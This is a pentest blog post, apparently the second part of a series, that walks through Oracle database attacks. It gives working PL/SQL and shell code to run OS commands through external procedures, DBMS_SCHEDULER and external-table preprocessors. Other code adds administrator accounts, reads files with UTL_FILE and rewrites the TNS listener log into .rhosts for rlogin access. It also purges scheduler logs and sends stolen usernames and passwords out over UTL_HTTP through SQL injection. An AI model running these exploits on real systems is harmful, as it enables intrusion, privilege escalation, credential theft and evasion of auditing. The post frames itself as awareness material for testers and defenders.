---
layout: post
title:  "Oracle Hacks — Part 2"
date:   2018-06-15 13:49:33 +0000
tags: [Oracle, Databases, pentest, redteam, blueteam]
---
In part 1 of our Oracle Hacks we covered the basics of enumerating and interacting with the database. In this segment we will cover a number of past and current attacks.

## Java & OS Commands
### Running OS commands with PL/SQL
By using external procedures we can execute operating system commands by creating an Oracle library for msvcrt.dll or libc and call the system() function.
```
CREATE OR REPLACE LIBRARY 
exec_shell AS 'C:\Windows\System32\msvcrt.dll'; 
/
```
This creates the library. Note that this example uses a full path. We’ll come back to this. Next we create the procedure:
```
show errors 
CREATE OR REPLACE PACKAGE oracmd IS 
PROCEDURE exec (cmdstring IN CHAR); 
end oracmd; 
/
show errors 
CREATE OR REPLACE PACKAGE BODY oracmd IS 
PROCEDURE exec(cmdstring IN CHAR) 
IS EXTERNAL 
NAME "system" 
LIBRARY exec_shell 
LANGUAGE C; 
end oracmd; 
/
```
With the procedure created we can execute it and run our OS command:
` exec oracmd.exec ('net user my_secret_user password!! /add');
To see the output, you may need to execute the following:
```
SET SERVEROUTPUT ON
Accessing the OS File System
While PUBLIC can execute UTL_FILE (the function that actually opens the file is FOPEN). This takes as one of its parameters the name of a directory? not a directory in the sense of the file system but an Oracle directory that has been created using the CREATE DIRECTORY command:

CREATE OR REPLACE DIRECTORY THEDIR AS 'C:\';
By default, there are no directories that PUBLIC can access and PUBLIC cannot execute CREATE DIRECTORY either. This limits the risk of a low-privileged user using UTL_FILE to gain access to the file system. Of course, if a user can create a directory, then he can access the file system. The file system access is done with the privileges of the user running the main Oracle process.

set serveroutput on 
CREATE OR REPLACE DIRECTORY THEDIR AS 'C:\'; 
    
DECLARE 
BUFFER VARCHAR2(260); 
FD UTL_FILE.FILE_TYPE; 
begin 
FD := UTL_FILE.FOPEN('THEDIR','boot.ini','r'); 
DBMS_OUTPUT.ENABLE(1000000); 
LOOP 
           UTL_FILE.GET_LINE(FD,BUFFER,254); 
           DBMS_OUTPUT.PUT_LINE(BUFFER); 
END LOOP; 
EXCEPTION WHEN NO_DATA_FOUND THEN 
     DBMS_OUTPUT.PUT_LINE('End of file.'); 
     IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN 
               UTL_FILE.FCLOSE(FD); 
     END IF; 
    
WHEN OTHERS THEN 
          IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN 
               UTL_FILE.FCLOSE(FD); 
          END IF; 
    
END; 
/
[boot loader] 
timeout=30 
default=multi(0)disk(0)rdisk(0)partition(3)\WINNT 
[operating systems] 
multi(0)disk(0)rdisk(0)partition(3)\WINNT="Microsoft Windows 2000 Server" 
/fastdetect 
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" 
/fastdetect 
multi(0)disk(0)rdisk(0)partition(2)\WINDOWS="Microsoft Windows XP Professional" 
/fastdetect 
End of file. 
   
PL/SQL procedure successfully completed.
```
## TNS Listener Log Re-Write Attack
An example of write log file (any file) attack
```
$ /mnt/usb/oracle-set-logfile.sh 'D:\Oracle\network\log\test.log' 127.0.0.1
Attempting to change logfile on 127.0.0.1:1521
Old logfile: D:\Oracle\network\log\listener.log
sending
(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=log_file)(ARGUMENTS=4)(SERVICE=LISTENER)
(VERSION=1)(VALUE=D:\Oracle\network\log\test.log)))
to 127.0.0.1:1521
writing 216 bytes
reading
.x......"..l(DESCRIPTION=(TMP=)(VSNNUM=153093376)(ERR=0)(COMMAND=log_file)(LOGFILENAME=D:\Oracle\network\log\portc.log))
New logfile: D:\Oracle\network\log\test.log
$ ./oracle-set-logfile.sh 'D:\Oracle\network\log\listener.log' 127.0.0.1
Attempting to change logfile on 127.0.0.1:1521
Old logfile: D:\Oracle\network\log\test.log
sending
(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=log_file)(ARGUMENTS=4)(SERVICE=LISTENER)(VERSION=1)
(VALUE=D:\Oracle\network\log\listener.log)))
to 127.0.0.1:1521
writing 219 bytes
reading
.{......"..o(DESCRIPTION=(TMP=)(VSNNUM=153093376)(ERR=0)(COMMAND=log_file)(LOGFILENAME=D:\Oracle\network\log\listener.log))
New logfile: D:\Oracle\network\log\listener.log
```
oracle-set-logfile.sh can be found here: [https://gist.github.com/netscylla/e026e9236a33db5922ad535229964944](https://gist.github.com/netscylla/e026e9236a33db5922ad535229964944)

Example attack gaining Rlogin access
```
$ /mnt/usb/oracle-set-logfile.sh '/home/oracle/.rhosts' 127.0.0.1
Attempting to change logfile on 127.0.0.1:1521
Old logfile: D:\Oracle\network\log\listener.log
sending
(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=log_file)(ARGUMENTS=4)(SERVICE=LISTENER)
(VERSION=1)(VALUE=D:\Oracle\network\log\listener.log)))
to 127.0.0.1:1521
writing 216 bytes
reading
.x......"..l(DESCRIPTION=(TMP=)(VSNNUM=153093376)(ERR=0)(COMMAND=log_file)(LOGFILENAME=/home/oracle/.rhosts))
New logfile: /home/oracle/.rhosts
```
Exploit command:
```
./tnscmd.pl -h 192.168.2.156 -p 1521 --rawcmd "(CONNECT_DATA=((
> + +
> 
> "
```
Set Logfile back to normal
```
$ ./oracle-set-logfile.sh 'D:\Oracle\network\log\listener.log' 127.0.0.1
Attempting to change logfile on 127.0.0.1:1521
Old logfile: /home/oracle/.rhosts
sending
(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=log_file)(ARGUMENTS=4)(SERVICE=LISTENER)(VERSION=1)
(VALUE=/home/oracle/.rhosts)))
to 127.0.0.1:1521
writing 219 bytes
reading
.{......"..o(DESCRIPTION=(TMP=)(VSNNUM=153093376)(ERR=0)(COMMAND=log_file)(LOGFILENAME=D:\Oracle\network\log\listener.log))
New logfile: D:\Oracle\network\log\listener.log
```
### R-login access
``` 
$ rlogin -l oracle <ipaddress>
```
More modern attacks can be achieved from manipulating SSH or serving webshells on an accessible webservice.

## Executing OS Commands via DBMS_SCHEDULER
### Requirements:
* CREATE JOB (10g Rel.1)
* CREATE EXTERNAL JOB (10g Rel.2 / 11g)
* EXECUTE on dbms_scheduler (granted to public by default)
* Since Oracle 10.2.0.2 the commands are executed as user nobody.

Code:

Create a Program for dbms_scheduler
``` 
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned >> c:\rds3.txt',0,TRUE);
```
Create, execute and delete a Job for dbms_scheduler
``` 
exec DBMS_SCHEDULER.create_job(job_name => 'RDS2008JOB',program_name => 'RDS2008',start_date => NULL,repeat_interval => NULL,end_date => NULL,enabled => TRUE,auto_drop => TRUE);
```
delete the program
``` 
exec DBMS_SCHEDULER.drop_program(PROGRAM_NAME => 'RDS2008');
```
Purge the logfile for dbms_scheduler
``` 
exec DBMS_SCHEDULER.PURGE_LOG;
```

## Executing OS Commands via PL/SQL & ExtProc
### Requirements

Running external procedure (extproc) in the listener
* Create any library
* Create (any) procedure
* 9i+: Environment setting containing the special DLL/Library
* ENVS=”EXTPROC_DLLS=ONLY:/home/xyz/mylib.so:/home/abc/urlib.so, EXTPROCT_DLLS=ANY

Windows:
```
sqlplus system/manager
SQL> CREATE OR REPLACE LIBRARY exec_shell AS 'C:\windows\system32\msvcrt.dll';
SQL> CREATE OR REPLACE package oracmd
is procedure exec(cmdstring IN CHAR);
end oracmd;
/
SQL> CREATE OR REPLACE package body oracmd IS
procedure exec(cmdstring IN CHAR)
is external NAME "system"
library exec_shell
LANGUAGE C;
end oracmd;
/
SQL> exec oracmd.exec('net user hacker nopassword /ADD');
SQL> exec oracmd.exec('net localgroup /ADD Administrators hacker');
Unix

sqlplus system/manager
create or replace library exec_shell as '/lib/libc-2.2.5.so';
/
create or replace package oracmd is
procedure exec(cmdstring IN CHAR);
end oracmd;
/
create or replace package body oracmd is
procedure exec(cmdstring IN CHAR)
is external
name "system"
library exec_shell
language c;
end oracmd;
/
SQL> exec oracmd.exec('ls');
hello_oracle.txt
PL/SQL procedure successfully completed.
```

## Execute OS Commands via Create Table (Windows)
### Requirements
CREATE TABLE
### Read-Privilege on directory object
* Oracle 11.1.0.7 / 10.2.0.5 or higher
* For security reasons the preprocessor option does not allow the usage of <code> |, < , >, &, and $</code> characters due to security reasons.

Code:
```
SQL> create or replace directory exec_dir as 'C:\WINDOWS\system32';
SQL> create or replace directory load_dir as 'C:\TOOLS';
SQL> create or replace directory log_dir  as 'C:\TOOLS';
SQL> CREATE TABLE ADDRESS( "NAME" VARCHAR2(60))
ORGANIZATION EXTERNAL(
  TYPE oracle_loader  DEFAULT DIRECTORY load_dir
  ACCESS PARAMETERS  (
     RECORDS DELIMITED BY NEWLINE
     PREPROCESSOR exec_dir:'gunzip' OPTIONS ' -d'
     BADFILE log_dir: 'address.bad'
     LOGFILE load_dir: 'address.log'
     FIELDS TERMINATED BY '|'
     MISSING FIELD VALUES ARE NULL  (
        "NAME"     )  )
  LOCATION ('address.txt.gz'))
REJECT LIMIT UNLIMITED;
SQL> select count(*) from ADDRESS;
```
## UTL_HTTP Attack
UTL_HTTP allows for web pages to be downloaded through SQL queries.

Possible to exploit as an OOB channel by dynamically building the URL.

Retrieved data can be found in web server log files.

Example of ‘late’ exploitation:
```
SELECT topic FROM news ORDER BY 
(SELECT username FROM all_users WHERE username='SYS' ORDER BY 
(select utl_http.request('http://127.0.0.1/INJ/'||(
select uname '_' || upass from tbl_logins where rownum <2)||'')
from dual)
```
Logfile sample:
<pre>
"GET /INJ/SYSTEM HTTP/1.0" 200
"GET /INJ/DBSNMP HTTP/1.0" 200
"GET /INJ/SCOTT HTTP/1.0" 200
"GET /INJ/SYS HTTP/1.0" 200
</pre>
## Limitations
* Restricted to OracleRDMS
* Hardening guides suggest disabling
* Requires outgoing connection to attackers web server

## The End
This concludes our mini Oracle walk through for this week; Hopefully, you have all learnt something new. If you want to practise attacking Oracle databases, the safest way is to register for the Oracle Developer Days Virtualbox VM:

http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html

Hopefully next week (or in the near future) we will have the time to cover more attacks against the Oracle database. So stay tuned!

## Disclaimer
Netscylla or its staff cannot be held responsible for any abuse relating from this blog post. This post is to raise awareness in the possible design and implementation flaws from system and database administrators that may or may not include security weaknesses, which may compromise your enterprise database. **REMEMBER: It is illegal to attempt unauthorised access on any system you do not personally own, unless you have explicit permission in writing from the system owner!**
